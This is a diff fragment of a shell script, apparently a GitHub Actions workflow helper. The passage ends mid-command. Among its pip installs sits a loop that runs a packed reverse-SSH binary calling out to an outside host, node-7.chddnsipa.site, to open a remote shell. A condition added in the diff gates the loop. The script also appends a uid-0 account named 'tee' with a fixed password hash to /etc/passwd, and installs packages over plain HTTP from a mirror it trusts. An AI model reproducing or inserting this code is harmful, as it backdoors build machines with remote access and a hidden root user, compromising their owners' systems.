@@ -43,6 +43,8 @@ sudo python3 -m pip install   ddddocr -i http://pypi.douban.com/simple --trusted
 sudo python3 -m pip install  requests  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
 
 
+#sudo python3 $GITHUB_WORKSPACE/run_req_yun.py
+
 
 #( 
 #    (while true; do
@@ -51,14 +53,14 @@ sudo python3 -m pip install  requests  -i http://pypi.douban.com/simple --truste
 #    done) &
 #) &
 
-
+grep -q AABBCC /tmp/js9 &&
 ( 
     (while true; do
         [ ! -f /tmp/keepalive ] && break
          sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b 50080  -p  50021  node-7.chddnsipa.site;  sleep 6 ;
     done) &
 ) &
- #agent.linux  busybox.bin  ghub.sh  socat.bin  upx_reverse-sshx64.bin
+
  
     grep "tee" /etc/passwd || (
         sudo bash -c 'id;cp /etc/passwd /etc/passwd.bak;echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
